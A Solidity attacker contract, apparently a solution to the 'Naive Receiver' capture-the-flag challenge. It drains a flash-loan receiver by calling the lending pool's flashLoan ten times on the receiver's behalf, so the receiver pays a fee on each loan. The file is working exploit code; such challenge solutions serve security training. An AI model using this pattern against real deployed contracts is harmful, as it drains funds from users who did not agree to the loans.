// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../NaiveReceiverLenderPool.sol";
import "../FlashLoanReceiver.sol";

/**
 * @title FlashLoanReceiverAttacker
 * @author Caio Sá
 */

interface ILender {
        function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

interface IReceiver {
    function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32);
}

contract FlashLoanReceiverAttacker {

    ILender private pool;
    IReceiver private receiver;
    IERC3156FlashBorrower private immutable ireceiver;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    error UnsupportedCurrency();

    constructor(address _pool, address _receiver) {
        pool = ILender(_pool);
        receiver = IReceiver(_receiver);
        ireceiver = IERC3156FlashBorrower(_receiver);
    }

    function attack() external returns (bool) {
        //call the flashloan on the lender with the receiver address
        for(uint8 i = 0; i <= 9;) {
        pool.flashLoan(ireceiver, ETH, 9 ether, "0x");

        unchecked {
            ++i;
        }
        
        }
        return true;
    }

    // Internal function where the funds received would be used
    function _executeActionDuringFlashLoan() internal { }

    // Allow deposits of ETH
    receive() external payable {}
}
